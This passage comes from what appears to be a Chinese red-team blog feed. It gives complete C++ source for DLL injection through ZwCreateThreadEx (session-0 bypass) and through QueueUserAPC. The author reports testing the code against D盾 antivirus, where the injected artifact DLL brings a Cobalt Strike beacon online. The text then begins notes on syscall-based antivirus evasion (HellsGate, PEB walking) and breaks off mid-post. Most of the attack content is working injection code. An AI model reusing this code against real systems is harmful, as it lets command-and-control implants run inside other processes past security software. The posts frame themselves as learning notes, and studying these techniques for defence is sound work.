class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Virtual Allocation Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入DLL路径</span></span><br><span class="line">    BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, DLLPath, dwSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (isWriteSuccess == FALSE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Write Process Memory Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载ntdll.dll</span></span><br><span class="line">    HMODULE hNtdDll = ::<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNtdDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load ntdll.dll Error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">    LoadLibraryA_Addr = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (LoadLibraryA_Addr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get the address of LoadLibrary Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得ZwCreateThreadEx函数地址</span></span><br><span class="line">        <span class="comment">// 使用函数指针类型的变量来接收</span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::<span class="built_in">GetProcAddress</span>(hNtdDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ZwCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get the address of LoadLibrary Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用ZwCreateThreadEx创建远程线程，实现DLL注入</span></span><br><span class="line">    dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS,</span><br><span class="line">        <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryA_Addr, pDllAddr,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThread Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    ::<span class="built_in">CloseHandle</span>(hProcess);        <span class="comment">// 对于HANDLE</span></span><br><span class="line">    ::<span class="built_in">FreeLibrary</span>(hNtdDll);         <span class="comment">// 对于HModule</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    BOOL flag = <span class="built_in">BypassSession0Injection</span>(<span class="number">3788</span>, <span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    BOOL flag = <span class="built_in">BypassSession0Injection</span>(<span class="number">4740</span>, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;fail!&quot;</span>, <span class="string">L&quot;BypassSession0Injection&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;BypassSession0Injection&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择D盾开刀</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102119766.png" alt="image-20240129225520558"></p><p>CS上线</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102119704.png" alt=" "></p><h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><h3 id="APC机制"><a href="#APC机制" class="headerlink" title="APC机制"></a>APC机制</h3><p>在Windows系统中，APC机制是一种并发机制，用于异步IO或者定时器，每个线程都会维护一个线程APC队列，通过QueueUserAPC函数把一个APC函数压入APC队列中。当处于用户模式的APC压入线程APC队列后，该线程并不直接调用APC函数，除非该函数处于可通知的状态，调用顺序为先入先出。</p><h3 id="WinAPI介绍-3"><a href="#WinAPI介绍-3" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>QueueUserAPC函数：将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ PAPCFIMC pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="操作过程-3"><a href="#操作过程-3" class="headerlink" title="操作过程"></a>操作过程</h3><ul><li><p>通过OpenProcess函数打开目标进程，获取目标进程的句柄</p></li><li><p>遍历线程快照，获取所有线程ID</p></li><li><p>调用VirtualAllocEx函数在目标进程中申请内存，再调用WriteProcessMemory写入DLL路径</p></li><li><p>遍历获取的线程ID，并调用OpenThread函数以THREAD_ALL_ACCESS访问权限打开线程，获取线程句柄</p><p>并调用QueueUserAPC函数向每个线程插入APC函数，设置APC函数的地址为LoadLibraryA函数的地址，APC函数参数为上述DLL路径地址</p></li><li><p>唤醒任意线程，即可执行APC，完成DLL的APC注入</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInjection.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintError</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* errContext)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> Error[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">::<span class="built_in">sprintf_s</span>(Error, <span class="string">&quot;%s Error[%d]\n&quot;</span>, errContext, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">::<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, Error, <span class="string">&quot;ERROR&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定进程的所有线程</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetProcessThreadList</span><span class="params">(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请空间</span></span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;<span class="comment">// 线程数组的索引</span></span><br><span class="line">DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;<span class="comment">// 最大线程数</span></span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;<span class="comment">// 链表的头部</span></span><br><span class="line"><span class="comment">// LPDWORD: 指向DWORD的指针</span></span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;<span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">pThreadIdList = (LPDWORD)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="built_in">sizeof</span>(DWORD), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="comment">// NULL未指定起始地址</span></span><br><span class="line"><span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化为0</span></span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(pThreadIdList, dwThreadIdListMaxCount * <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">THREADENTRY32 th32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拍摄快照</span></span><br><span class="line">hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, th32ProcessID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构的大小</span></span><br><span class="line">th32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有THREADENTRY32结构，按顺序填入数组</span></span><br><span class="line">BOOL bRet = <span class="built_in">Thread32First</span>(hThreadSnap, &amp;th32);</span><br><span class="line"><span class="keyword">while</span>(bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(th32.th32OwnerProcessID == th32ProcessID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line">bRet = <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;th32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pThreadIdListLength = dwThreadIdListLength; <span class="comment">// 捕获的线程快照个数</span></span><br><span class="line">*ppThreadIdList = pThreadIdList; <span class="comment">// 线程地址的数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">APCInjection</span><span class="params">(HANDLE hProcess, CHAR* wzDLLFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// (指定进程, DLL路径, 线程链表的头部, 链表长度)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">PVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T page_size = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">lpAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, page_size, </span><br><span class="line">MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PrintError</span>(<span class="string">&quot;VirtualAllocEx - Error\n\n&quot;</span>);</span><br><span class="line"><span class="comment">// 释放空间</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="comment">// 关闭</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将DLL路径写入到内存中</span></span><br><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr,</span><br><span class="line">wzDLLFullPath, (<span class="built_in">strlen</span>(wzDLLFullPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(wzDLLFullPath), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isWriteSuccess == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PrintError</span>(<span class="string">&quot;WriteProcessMemory - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得LoadLibraryA的地址</span></span><br><span class="line">PVOID LoadLibraryAddress = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="comment">// PVOID: void*</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历线程链表, 插入APC</span></span><br><span class="line"><span class="type">float</span> fail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">HANDLE hThread = ::<span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 插入APC</span></span><br><span class="line"><span class="keyword">if</span> (!::<span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) &#123;</span><br><span class="line">fail++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭线程句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Thread: %d\n&quot;</span>, dwThreadIdListLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Failed: %d\n&quot;</span>, (<span class="type">int</span>)fail);</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> FailRate = dwThreadIdListLength / fail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)fail == <span class="number">0</span> || FailRate &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Successful! APC Injection!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fail!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD PID = <span class="number">10544</span>;</span><br><span class="line">CHAR wzDllFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86_apc.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86_apc.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BOOL isGetProcessThreadList = <span class="built_in">GetProcessThreadList</span>(PID, &amp;pThreadIdList, &amp;dwThreadIdListLength);</span><br><span class="line"><span class="keyword">if</span> (!isGetProcessThreadList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t list the threads\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open Process\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入</span></span><br><span class="line">BOOL isInjectSuccess = <span class="built_in">APCInjection</span>(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength);</span><br><span class="line"><span class="keyword">if</span> (!isInjectSuccess) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to inject DLL\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿D盾开刀：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102118265.png" alt="image-20240131153206368"></p><p>还是CS上线</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102128616.png" alt="image-20240131153108139"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><p><a href="https://learn.microsoft.com/en-us/windows/">https://learn.microsoft.com/en-us/windows/</a></p></li><li><p><a href="https://xz.aliyun.com/t/11153?time__1311=mqmx0DyDcDn0e7KDsKoYKmx7Tq+nDBD=7YD&alichlgref=https://www.google.co.uk/#toc-0">https://xz.aliyun.com/t/11153?time__1311=mqmx0DyDcDn0e7KDsKoYKmx7Tq%2BnDBD%3D7YD&amp;alichlgref=https%3A%2F%2Fwww.google.co.uk%2F#toc-0</a></p></li><li><p><a href="https://xz.aliyun.com/t/10318?time__1311=mq+xBDyDuGBDcDBqDTmGIDkzeD=X5qKqx&alichlgref=https://www.google.co.uk/#toc-5">https://xz.aliyun.com/t/10318?time__1311=mq%2BxBDyDuGBDcDBqDTmGIDkzeD%3DX5qKqx&amp;alichlgref=https%3A%2F%2Fwww.google.co.uk%2F#toc-5</a></p></li><li><p><a href="https://www.anquanke.com/post/id/247813">https://www.anquanke.com/post/id/247813</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syscall免杀学习记录(持续更新)</title>
      <link href="/2024/04/10/syscall-AVBypass/"/>
      <url>/2024/04/10/syscall-AVBypass/</url>
      
        <content type="html"><![CDATA[<h1 id="PEB等结构"><a href="#PEB等结构" class="headerlink" title="PEB等结构"></a>PEB等结构</h1><p>神图</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151932890.jpeg" alt="img"></p><h1 id="Windows中的API调用机制"><a href="#Windows中的API调用机制" class="headerlink" title="Windows中的API调用机制"></a>Windows中的API调用机制</h1><p>简单来说，Ring3中的kernel32.dll中的函数会调用ntdll.dll中的函数，在ntdll.dll中使用syscall指令从Ring3进入Ring0</p><ul><li>测试：</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151932807.png" alt="image-20240307154434280"></p><p>可以发现创建线程</p><p><code>kernel32.dll</code>的<code>CreateThread</code>  &#x3D;&gt; <code>KernelBase.dll</code>的<code>CreateRemoteThreadEx</code> &#x3D;&gt; <code>ntdll.dll</code>的<code>NtCreateThreadEx</code></p><p><code>ntdll.dll</code>中相当于保存着执行功能的函数以及系统调用存根，<code>ntdll.dll</code>导出<code>Windows Native API</code>，具体实现在内核态中的<code>ntoskrnl.exe</code>中</p><ul><li>使用IDA查看ntdll.dll</li></ul><p>NtCreateThreadEx</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933315.png" alt="image-20240412093259939"></p><h1 id="Windows中定位API的原理"><a href="#Windows中定位API的原理" class="headerlink" title="Windows中定位API的原理"></a>Windows中定位API的原理</h1><p>​定位WinAPI对于开发通用shellcode有着重要意义。</p><p>​而WinAPI通过动态链接库中的导出函数（可以查看导出表Export Directory）来实现的，比如内存操作等API在kernel32.dll中实现，GUI的相关API在user32.dll中实现。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933819.png" alt="image-20240413132824494"></p><p>​win32下的shellcode开发通常使用<code>TEB-&gt;PEB-&gt;LDR</code>的思路来找到，具体过程如下：</p><ul><li><p>通过段选择器FS在内存中找到线程环境块TEB</p></li><li><p>线程环境块偏移位置为0x30的位置 或者 直接通过GS段寄存器0x30偏移处 获取PEB指针</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933811.png" alt="image-20240413133603759"></p><ul><li>PEB中偏移位置为0x0C的位置存放着PEB_LDR_DATA结构体的指针，其中存放着被进程装载的动态链接库的信息</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933512.png" alt="image-20240413133948094"></p><ul><li>PEB_LDR_DATA结构体中存放着三条链表，这均可以获取API</li></ul><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240413134235247.png" alt="image-20240413134235247"></p><p>以InlnitializationOrderModuleList为例：</p><p>​模块初始化链表InlnitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32.dll</p><p>​到对应模块后，在InInitializationOrderModuleList的0x08偏移处就是ntdll.dll的基址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933234.png" alt="image-20240413134602172"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404151933799.png"></p><h1 id="syscall免杀"><a href="#syscall免杀" class="headerlink" title="syscall免杀"></a>syscall免杀</h1><h2 id="HellsGate"><a href="#HellsGate" class="headerlink" title="HellsGate"></a>HellsGate</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>读取ntdll.dll，解析并遍历ntdll.dll的导出表，然后根据函数名取出函数地址，再用函数指针的方式进行syscall调用，从而绕过Ring3上的hook检测</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul><li>获取ldrDataEntry的基址</li></ul><p>​HellsGate的作者从InMemoryOrderModuleList出发，最后偏移0x10个字节即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p><img 